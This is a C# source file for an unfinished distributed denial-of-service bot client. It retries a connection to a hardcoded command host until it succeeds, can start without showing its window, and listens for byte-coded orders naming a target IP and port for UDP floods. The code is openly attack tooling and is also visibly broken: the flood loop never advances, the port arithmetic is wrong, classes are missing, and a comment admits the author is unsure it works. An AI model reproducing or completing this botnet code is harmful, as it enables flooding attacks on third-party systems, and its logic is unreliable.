using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;





namespace D_D_o_S
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }
        public Form1(bool show)
        {
            if (show)
            {
                InitializeComponent();
            }
            else
            {





            }


        }
        //void Form1_Shown(object sender, EventArgs e)
        //{
        //    //throw new NotImplementedException();
        //    this.SendToBack();
        //}

        private void Form1_Load(object sender, EventArgs e)
        {
        retry:
            try
            {
                TestClient c = new TestClient(IPAddress.Parse("192.168.1.5"), 80);
            }
            catch
            {
                goto retry;
            }
        }
    }
    class TestClient
    {
        TcpClient c;
        NetworkStream nws;
        Thread t;
        public TestClient(IPAddress ipa, int port)//
        {
            try
            {
                c = new TcpClient(ipa.ToString(), port);
            }
            catch
            {
                throw new SocketException();

            }
            nws = c.GetStream();
            byte[] bfr = new byte[64];
            nws.Read(bfr, 0, 64);
            c.Close();
            for (int i = 0; i != 10000; )
            {
                i++;
            }
            c = new TcpClient(ipa.ToString(), bfr[0] + bfr[1] * 10 + bfr[2] * 100);
            nws = c.GetStream();
            t = new Thread(new ThreadStart(listen)); t.Start();
            nws.Write(Encoding.ASCII.GetBytes("fuck"), 0, 4);
            nws.Write(Encoding.ASCII.GetBytes("pee poo"), 0, 7);


        }

        void listen()
        {
        restart:
            byte[] bfr = new byte[1024];
            try
            {
                nws.Read(bfr, 0, 1024);
            }
            catch
            {
                return;
            }

            string ip;
            ip = bfr[2].ToString() + "."
                + bfr[3].ToString() + "."
                + bfr[4].ToString() + "."
                + bfr[5].ToString();
            int port = bfr[6] * 10 + bfr[7] * 10;
            //剖析我給他的命令
            if (bfr[0] == 0)//means make the new update
            {



            }
            if (bfr[0] == 1)//means start hack
            {
                switch (bfr[1])
                {
                    case 0://means udp hack
                        udpFlood[] fldr = new udpFlood[bfr[8] + bfr[9]];//guys / thread

                        for (int i = 0; i != fldr.Length; )
                        {
                            fldr[i] = new udpFlood(bfr[10], ip, port);
                            // i am not sure about all this things are right , please check it by yourself






                            //remember to use++
                        }








                        // and you needs to do the guys per tools
                        break;
                    case 1://means find port attack



                        break;





                }

            }












            goto restart;

        }




    }

}
